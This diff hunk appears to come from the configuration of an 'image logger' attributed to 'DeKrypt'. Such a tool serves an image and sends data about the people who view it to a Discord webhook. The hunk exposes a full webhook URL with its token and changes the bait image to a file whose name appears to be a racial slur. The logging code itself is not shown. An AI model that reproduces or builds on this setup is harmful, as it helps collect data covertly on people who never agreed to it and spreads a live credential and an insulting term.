@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334769715289260073/KjfOV2s7oW2pclw6V-E0LedngglvdNEVz6b7IMK8mnzqBsEsJw4zYl6y6mI4jv3PB-Tm",
-    "image": "https://ih1.redbubble.net/image.591813054.6019/flat,800x800,075,f.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/1223953887409737750/1353432314138464326/kala_habshi.png?ex=67e1a191&is=67e05011&hm=d6815e19218388b5dfd73dc136cd0c067ba0dd970fb07d6c6346aee2b4a9fd84&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
